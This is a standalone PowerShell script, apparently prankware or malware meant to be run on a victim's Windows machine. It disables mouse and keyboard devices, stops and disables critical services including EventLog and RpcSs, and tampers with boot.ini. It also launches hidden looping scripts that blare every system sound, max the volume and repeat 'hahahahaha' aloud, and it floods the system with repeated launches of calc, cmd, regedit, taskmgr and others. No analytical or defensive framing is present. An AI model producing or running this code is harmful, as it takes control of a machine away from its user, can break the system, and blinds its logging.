$notificationScriptContent = @'
Function Send-NotificationSoundSpam {
    param ([int]$Interval = 0)

    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | ForEach-Object {
        (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").PlaySync()
        Start-Sleep -Milliseconds 1
    }
}

Send-NotificationSoundSpam
'@
$notificationScriptPath = "$PWD\notification.ps1"
Set-Content -Path $notificationScriptPath -Value $notificationScriptContent

$trayScriptContent = @'
$WScript = New-Object -com wscript.shell
while ($true) {
    $WScript.SendKeys([char]175)
    Start-Sleep -Milliseconds 1
}
'@
$trayScriptPath = "$PWD\tray.ps1"
Set-Content -Path $trayScriptPath -Value $trayScriptContent

$speechScriptContent = @'
Add-Type -AssemblyName System.Speech
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
while ($true) {
    $speak.Speak("hahahahaha")
    Start-Sleep -Milliseconds 1
}
'@
$speechScriptPath = "$PWD\speech.ps1"
Set-Content -Path $speechScriptPath -Value $speechScriptContent

# Disable mouse and keyboard drivers
$mouseDriver = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*Mouse*" }
$keyboardDriver = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*Keyboard*" }

if ($mouseDriver) {
    Disable-PnpDevice -InstanceId $mouseDriver.InstanceId -Confirm:$false
}

if ($keyboardDriver) {
    Disable-PnpDevice -InstanceId $keyboardDriver.InstanceId -Confirm:$false
}

$services = @("EventLog", "PlugPlay", "RpcSs", "DcomLaunch")
foreach ($service in $services) {
    Set-Service -Name $service -StartupType Disabled
    Stop-Service -Name $service -Force
}

$bootConfigPath = "C:\Windows\System32\boot.ini"
if (Test-Path -Path $bootConfigPath) {
    Add-Content -Path $bootConfigPath -Value "/FAILSAFE"
}

Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$notificationScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$trayScriptPath`""

$WScript = New-Object -com wscript.shell
1..50 | % { $WScript.SendKeys([char]175) }

$processes = @("calc.exe", "explorer.exe", "notepad.exe", "cmd.exe", "regedit.exe", "msinfo32.exe", "taskmgr.exe")
for ($i = 1; $i -le 20; $i++) {
    foreach ($process in $processes) {
        Start-Process -FilePath $process -NoNewWindow
    }
}
